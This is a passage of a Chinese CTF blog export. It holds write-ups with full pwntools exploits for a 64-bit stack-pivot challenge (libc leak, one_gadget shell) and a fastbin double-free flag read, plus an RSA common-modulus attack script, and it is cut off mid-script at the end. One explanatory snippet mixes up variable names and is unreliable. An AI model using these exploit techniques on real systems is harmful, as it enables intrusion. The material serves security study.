title="利用"></a>利用</h3><p>最最最普通的，没有骚操作的栈迁移题目（也就是本题），会进行两次栈迁移。第一次迁移泄露 libc 基地址，并且为第二次执行 one_gadget 之类 get shell。</p><p><strong>大概攻击流程</strong></p><ol><li>栈溢出控制 ebp 为第一次栈迁移做准备，控制 eip 再次执行 leave 指令。</li><li>写入第一次迁移的栈数据，功能需要有：泄露 libc 基地址，为第二次迁移做准备。</li><li>第二次迁移的栈执行 one_gadget 。</li></ol><p>栈溢出的话问题不大，在第一次 read 写入 0x60 就到 ebp ，然后按需覆盖就可以。比如说我决定将第一次栈迁移到 bank+0x90 ，那么 ebp 就覆盖为 bank+0x90 。调准地址明确了，下一步就需要触发栈迁移了，也就是在执行一次 leave 指令，通过覆写 eip 为 leave 。(bank地址为0x601080 ， leave地址为0x400699)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload_0 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span></span><br><span class="line">payload_0 += bank+<span class="number">0x90</span></span><br><span class="line">payload_0 += leave</span><br></pre></td></tr></table></figure><p>第一次栈迁移外部准备完成，就需要向 bank+0x90 写入需要执行的代码。这道题是利用的是第二次 read 输入 stack 1 数据。前面说过，需要进行两次迁移，所以在输入 stack 1 数据要考虑第二次栈迁移的地址，我选择 bank+0x60 。</p><p>在 stack 1 需要泄露出 libc 基地址，写入stack 2 数据。泄露地址就选择一个函数真实地址输出并计算偏移，然后调用 main 函数中的 read2 写入 stack 2 ，因为顺序执行，因此还执行了一次 leave （即 main 函数从 read2 开始运行一遍），触发第二次栈迁移。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload_1 = <span class="string">&#x27;\0&#x27;</span>*<span class="number">0x90</span><span class="comment">#填充到bank+0x90</span></span><br><span class="line">payload_1 += p64(bank+<span class="number">0x60</span>)<span class="comment">#stack2地址</span></span><br><span class="line">payload_1 += p64(pop_rdi)<span class="comment">#传参</span></span><br><span class="line">payload_1 += p64(puts_got)<span class="comment">#泄露函数</span></span><br><span class="line">payload_1 += p64(puts_plt)</span><br><span class="line">payload_1 += p64(<span class="number">0x400680</span>)<span class="comment">#main中的read2&amp;leave</span></span><br></pre></td></tr></table></figure><p>stack 1 准备完成，并且为 stack 2 预留写入函数，接下来就是处理并写入 stack 2 。因为这个栈已经是最后一个栈，所以不需要关心 ebp 的值，我给它赋值 0xdeadbeef 。</p><p>如果遇到有的题目需要3 次、 4 次等多次迁移，就将 ebp 赋值为下一次迁移的地址，直到最后一次。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">libc_base=u64(p.recv(<span class="number">6</span>)[:].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]<span class="comment">#泄露libc基地址</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span><span class="comment">#填充到bank+0x60</span></span><br><span class="line">payload_2 += p64(<span class="number">0xdeadbeef</span>)<span class="comment">#ebp值</span></span><br><span class="line">payload += p64(one_gadget+libc_base)<span class="comment">#one_gadget</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>填充跳转示意图：</p><p><img src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200311153802.png"></p><p>完整 exp </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./borrowstack&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./borrowstack&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">bank = <span class="number">0x601080</span></span><br><span class="line">pop_rdi = <span class="number">0x400703</span></span><br><span class="line">leave = <span class="number">0x400699</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">one_gadget = <span class="number">0xf02a4</span></span><br><span class="line"></span><br><span class="line">payload_0 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span></span><br><span class="line">payload_0 += p64(bank+<span class="number">0x90</span>) + p64(leave)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;want&#x27;</span>)</span><br><span class="line">p.send(payload_0)</span><br><span class="line"></span><br><span class="line">payload_1=<span class="string">&#x27;\0&#x27;</span>*<span class="number">0x90</span>+p64(bank+<span class="number">0x60</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)</span><br><span class="line">payload_1+=p64(<span class="number">0x0400680</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;now!\n&#x27;</span>,payload_1)</span><br><span class="line"></span><br><span class="line">libc_base=u64(p.recv(<span class="number">6</span>)[:].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">info(<span class="string">&quot;one:&quot;</span>+<span class="built_in">hex</span>(libc_base+one_gadget))</span><br><span class="line"></span><br><span class="line">payload_2=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0xdeadbeef</span>)+p64(one_gadget+libc_base)</span><br><span class="line">p.sendline(payload_2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>前面提到过，多次连续栈迁移需要提前明确每次栈空间地址。就好像上面那题目，stack 2 地址在写入 stack 1 数据的一并写入。其实 stack 2 地址也可以在执行 stack 1 的时候再写入。但一定要注意：执行的命令写入位置是在 esp + 0x8 位置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">payload_1 = <span class="string">&#x27;\0&#x27;</span>*<span class="number">0x90</span><span class="comment">#填充到bank+0x90</span></span><br><span class="line">payload_1 += <span class="string">&#x27;\0&#x27;</span>*<span class="number">0x8</span><span class="comment">#填充（原应写入ebp）</span></span><br><span class="line">payload_1 += p64(pop_rdi)<span class="comment">#传参</span></span><br><span class="line">payload_1 += p64(puts_got)<span class="comment">#泄露函数</span></span><br><span class="line">payload_1 += p64(puts_plt)</span><br><span class="line"></span><br><span class="line">payload_1 += p64(pop_ebp)<span class="comment">#传参ebp</span></span><br><span class="line">payload_1 += p64(bank+<span class="number">0x60</span>)<span class="comment">#stack 2</span></span><br><span class="line"></span><br><span class="line">payload_1 += p64(<span class="number">0x400680</span>)<span class="comment">#main中的read2&amp;leave</span></span><br></pre></td></tr></table></figure><p>32 位是栈传参；64 位前 6 个参数是寄存器传参，后面的栈传参 <a href="http://abcdxyzk.github.io/blog/2012/11/23/assembly-args/">Link</a> 。</p><p><strong>能不能用 system(‘/bin/sh’) ？</strong></p><p>理论上可行，都只控制程序流。但实际上 bss 隔壁就是 got 表地址，如果调用函数层级很多，需要大量栈空间就可能会覆盖掉 got 表，从而导致错误。我尝试将第一次迁移地址定为 bank+0x90 ，第二次迁移地址定位 bank+0x80 ，在第二次迁移位置正确写入 system(‘/bin/sh’) 。执行到 system 中的 <code>&lt;do_system+157&gt;    call   sigaction</code> 时，got 表被覆盖一部分，而报错退出。第二次迁移位置不能在高地址移动了，所以使用 onegadget 。onegadget 更省内存空间。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>栈迁移可以用在栈溢出但是空间不足的情况下，构建虚拟栈空间。</p><p>栈迁移通过直接直接控制 ebp 来间接控制 esp ，实现关键指令（函数）为 leave 或其他可以将 ebp 赋值给 esp 的指令。</p><p>栈迁移构建的虚拟栈，不算是一个完整的栈，更像是栈的顺序执行结构，因为 esp 与 ebp 之间关系可能会异于正常。</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 栈迁移 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>i春秋新春战疫WriteUp</title>
      <link href="archives/d5e789b1/"/>
      <url>archives/d5e789b1/</url>
      
        <content type="html"><![CDATA[<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="1-easy-rsa"><a href="#1-easy-rsa" class="headerlink" title="1. easy_rsa"></a>1. easy_rsa</h3><p>下载附件，内容如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">27560959918385616419486273009594513460044316476337842585463553105701869531698366304637678008602799005181601310816935394003041930445509801196554897781529962616349442136039951911764620999116915741924245788988332766182305635804754798018489793066811741026902011980807157882639313892932653620491354630354060462594865874663773934670618930504925812833202047183166423043264815905853486053255310346030416687430724204177468176762512566055165798172418622268751968793997676391170773216291607752885987933866163158257336522567086228092863302685493888839866559622429685925525799985062044536032584132602747754107800116960090941957657</span></span><br><span class="line">e1 = <span class="number">464857</span></span><br><span class="line">e2 = <span class="number">190529</span></span><br><span class="line">c1 = <span class="number">21823306870841016169952481786862436752894840403702198056283357605213928505593301063582851595978932538906067287633295577036042158302374948726749348518563038266373826871950904733691046595387955703305846728530987885075910490362453202598654326947224392718573893241175123285569008519568745153449344966513636585290770127055273442962689462195231016899149101764299663284434805817339348868793709084130862028614587704503862805479792184019334567648078767418576316170976110991128933886639402771294997811025942544455255589081280244545901394681866421223066422484654301298662143648389546410087950190562132305368935595374543145047531</span></span><br><span class="line">c2 = <span class="number">9206260935066257829121388953665257330462733292786644374322218835580114859866206824679553444406457919107749074087554277542345820215439646770680403669560474462369400641865810922332023620699210211474208020801386285068698280364369889940167999918586298280468301097349599560130461998493342138792264005228209537462674085410740693861782834212336781821810115004115324470013999092462310414257990310781534056807393206155460371454836230410545171068506044174001172922614805135260670524852139187370335492876094059860576794839704978988507147972109411033377749446821374195721696073748745825273557964015532261000826958288349348269664</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一个 n 两个 e 两个 c ，判断为 RSA  共模攻击，上脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#RSA 共模攻击脚本</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s, s2n</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"></span><br><span class="line"><span class="comment"># 扩展欧几里得算法</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">  <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    g, y, x = egcd(b % a, a)</span><br><span class="line">    <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">  n = <span class="number">27560959918385616419486273009594513460044316476337842585463553105701869531698366304637678008602799005181601310816935394003041930445509801196554897781529962616349442136039951911764620999116915741924245788988332766182305635804754798018489793066811741026902011980807157882639313892932653620491354630354060462594865874663773934670618930504925812833202047183166423043264815905853486053255310346030416687430724204177468176762512566055165798172418622268751968793997676391170773216291607752885987933866163158257336522567086228092863302685493888839866559622429685925525799985062044536032584132602747754107800116960090941957657</span></span><br><span class="line">  c1 = <span class="number">21823306870841016169952481786862436752894840403702198056283357605213928505593301063582851595978932538906067287633295577036042158302374948726749348518563038266373826871950904733691046595387955703305846728530987885075910490362453202598654326947224392718573893241175123285569008519568745153449344966513636585290770127055273442962689462195231016899149101764299663284434805817339348868793709084130862028614587704503862805479792184019334567648078767418576316170976110991128933886639402771294997811025942544455255589081280244545901394681866421223066422484654301298662143648389546410087950190562132305368935595374543145047531</span></span><br><span class="line">  c2 = <span class="number">9206260935066257829121388953665257330462733292786644374322218835580114859866206824679553444406457919107749074087554277542345820215439646770680403669560474462369400641865810922332023620699210211474208020801386285068698280364369889940167999918586298280468301097349599560130461998493342138792264005228209537462674085410740693861782834212336781821810115004115324470013999092462310414257990310781534056807393206155460371454836230410545171068506044174001172922614805135260670524852139187370335492876094059860576794839704978988507147972109411033377749446821374195721696073748745825273557964015532261000826958288349348269664</span></span><br><span class="line">  e1 = <span class="number">464857</span></span><br><span class="line">  e2 = <span class="number">190529</span></span><br><span class="line">  s = egcd(e1, e2)</span><br><span class="line">  s1 = s[<span class="number">1</span>]</span><br><span class="line">  s2 = s[<span class="number">2</span>]</span><br><span class="line">  <span class="comment"># 求模反元素</span></span><br><span class="line">  <span class="keyword">if</span> s1 &amp;lt; <span class="number">0</span>:</span><br><span class="line">    s1 = - s1</span><br><span class="line">    c1 = invert(c1, n)</span><br><span class="line">  <span class="keyword">elif</span> s2 &amp;lt; <span class="number">0</span>:</span><br><span class="line">    s2 = - s2</span><br><span class="line">    c2 = invert(c2, n)</span><br><span class="line"></span><br><span class="line">  m = <span class="built_in">pow</span>(c1, s1, n) * <span class="built_in">pow</span>(c2, s2, n) % n</span><br><span class="line">  print(n2s(m))  <span class="comment"># 二进制转string</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == &amp;<span class="comment">#039;__main__&amp;#039;:</span></span><br><span class="line">  main()</span><br></pre></td></tr></table></figure><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="Some-thing-exceting"><a href="#Some-thing-exceting" class="headerlink" title="Some_thing_exceting"></a>Some_thing_exceting</h3><p>64 位打开 Canary、NX ，菜单式程序，基本增<del>删</del>查改功能。creat 函数内发现数据结构体，允许 size 为 1~112 ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Banala</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> *ba;</span><br><span class="line">    <span class="keyword">char</span> *na</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞为 double free ，位于 delete 函数，free 后没有归零指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;quot;#######################&amp;quot;);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;quot;#    Delete Banana    #&amp;quot;);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;quot;#---------------------#&amp;quot;);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;quot;&amp;gt; Banana ID : &amp;quot;);</span><br><span class="line">  _isoc99_scanf((__int64)&amp;quot;%d&amp;quot;, (__int64)&amp;amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &amp;lt; <span class="number">0</span> || v1 &amp;gt; <span class="number">10</span> || !ptr[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(&amp;quot;Emmmmmm!Maybe you want Fool me!&amp;quot;);</span><br><span class="line">    goodbye();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(*(<span class="keyword">void</span> **)ptr[v1]);                      <span class="comment">// free ba</span></span><br><span class="line">  <span class="built_in">free</span>(*((<span class="keyword">void</span> **)ptr[v1] + <span class="number">1</span>));                <span class="comment">// free na</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(ptr[v1]);                                <span class="comment">// free struct</span></span><br><span class="line">  <span class="built_in">puts</span>(&amp;quot;#---------------------#&amp;quot;);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;quot;#      ALL Down!      #&amp;quot;);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;quot;#######################&amp;quot;);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在看后门函数 read_flag() ，将 flag 读入到 bss 段，并且（15行）写入 0x60 。若假设 flag 位于某一个堆的 fd 位置， 0x60 刚好位于该堆的 size 位。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">read_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  stream = fopen(&amp;quot;/flag&amp;quot;, &amp;quot;r&amp;quot;);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(&amp;quot;Emmmmmm!Maybe you want Fool me!&amp;quot;);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  byte_6020A0 = <span class="number">96</span>;                             <span class="comment">// chunk size</span></span><br><span class="line">  fgets(s, <span class="number">45</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用思路：double free 让某一个堆既处于 fastbin 又是被分配状态。修改该堆 fd 指针，重新分配相同大小堆，用程序 view 函数读出。</p><p>完整 exp 如下：</p><p>最后一轮申请堆使用的是0x20 是因为修改了堆数据，申请其他大小会报错，所以就用 fastbin 中剩下的堆，gdb 查一下就看到了剩下 0x20 ，所以用 0x20 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = &amp;<span class="comment">#039;debug&amp;#039;</span></span><br><span class="line">p = process(&amp;quot;./excited&amp;quot;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">creat</span>(<span class="params">ba_len,ba,na_len,na</span>):</span></span><br><span class="line">    p.recvuntil(&amp;quot;want to do :&amp;quot;)</span><br><span class="line">    p.sendline(&amp;quot;<span class="number">1</span>&amp;quot;)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(&amp;quot;length :&amp;quot;)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(ba_len))</span><br><span class="line">    p.recvuntil(&amp;quot;ba :&amp;quot;)</span><br><span class="line">    p.sendline(ba)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(&amp;quot;length :&amp;quot;)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(na_len))</span><br><span class="line">    p.recvuntil(&amp;quot;na :&amp;quot;)</span><br><span class="line">    p.sendline(na)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    p.recvuntil(&amp;quot;want to do :&amp;quot;)</span><br><span class="line">    p.sendline(&amp;quot;<span class="number">3</span>&amp;quot;)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(&amp;quot;ID :&amp;quot;)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    p.recvuntil(&amp;quot;want to do :&amp;quot;)</span><br><span class="line">    p.sendline(&amp;quot;<span class="number">4</span>&amp;quot;)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(&amp;quot;ID :&amp;quot;)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line">creat(<span class="number">0x50</span>,&amp;<span class="comment">#039;a&amp;#039;*0x50,0x50,&amp;#039;b&amp;#039;*0x50)//被double free chuck</span></span><br><span class="line">creat(<span class="number">0x50</span>,&amp;<span class="comment">#039;c&amp;#039;*0x50,0x50,&amp;#039;d&amp;#039;*0x50)//用于隔开double free chunk</span></span><br><span class="line">creat(<span class="number">0x50</span>,&amp;<span class="comment">#039;e&amp;#039;*0x50,0x50,&amp;#039;f&amp;#039;*0x50)//防止上面两个chunk free 与top chunk合并</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)//间隔</span><br><span class="line">delete(<span class="number">0</span>)//double free</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">creat(<span class="number">0x50</span>,p64(<span class="number">0x06020A8</span>-<span class="number">0x10</span>)*<span class="number">10</span>,<span class="number">0x50</span>,p64(<span class="number">0x06020A8</span>-<span class="number">0x10</span>)*<span class="number">10</span>)//edit chunk1 fd to flag</span><br><span class="line">creat(<span class="number">0x50</span>,&amp;<span class="comment">#039;&amp;#039;,0x50,&amp;#039;&amp;#039;)</span></span><br><span class="line">creat(<span class="number">0x50</span>,&amp;<span class="comment">#039;&amp;#039;,0x20,&amp;#039;&amp;#039;)</span></span><br><span class="line">view(<span class="number">5</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>还有点不清楚的就是：完成 double free 后申请堆的时候，使用 fastbin 的顺序很奇怪。具体点说：每轮 free fastbin 会增加 1 个 0x20 、2 个 0x60 chunk 。但是最终 free 3 轮后有 4 个 0x20 、6 个 0x60 。紧接着第一轮申请使用的是第三轮和第二轮各一个 0x60 。最后我是每申请一次就调试一次，看每次申请的是那块 chunk。</p><p>这里搞了很久，各位师傅知道的告诉一下。</p><h3 id="borrowstack"><a href="#borrowstack" class="headerlink" title="borrowstack"></a>borrowstack</h3><p>64 位栈迁移</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = &amp;<span class="comment">#039;debug&amp;#039;</span></span><br><span class="line">p = process(&amp;quot;./borrowstack&amp;quot;)</span><br><span class="line">elf = ELF(&amp;quot;./borrowstack&amp;quot;)</span><br><span class="line">libc = ELF(&amp;quot;/lib/x86_64-linux-gnu/libc.so<span class="number">.6</span>&amp;quot;)</span><br><span class="line"></span><br><span class="line">bank = <span class="number">0x601080</span></span><br><span class="line">pop_rdi = <span class="number">0x400703</span></span><br><span class="line">leave = <span class="number">0x400699</span></span><br><span class="line">puts_plt = elf.plt[&amp;<span class="comment">#039;puts&amp;#039;]</span></span><br><span class="line">puts_got = elf.got[&amp;<span class="comment">#039;puts&amp;#039;]</span></span><br><span class="line">one_gadget = <span class="number">0xf02a4</span></span><br><span class="line"></span><br><span class="line">payload_0 = &amp;<span class="comment">#039;a&amp;#039;*0x60</span></span><br><span class="line">payload_0 += p64(bank+<span class="number">0x90</span>) + p64(leave)</span><br><span class="line">p.recvuntil(&amp;<span class="comment">#039;want&amp;#039;)</span></span><br><span class="line">p.send(payload_0)</span><br><span class="line"></span><br><span class="line">pay=&amp;<span class="comment">#039;\0&amp;#039;*0x90+p64(bank+0x60)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)</span></span><br><span class="line">pay+=p64(<span class="number">0x0400680</span>)</span><br><span class="line">p.sendafter(&amp;<span class="comment">#039;now!\n&amp;#039;,pay)</span></span><br><span class="line"></span><br><span class="line">libc_base=u64(p.recv(<span class="number">6</span>)[:].ljust(<span class="number">8</span>,&amp;<span 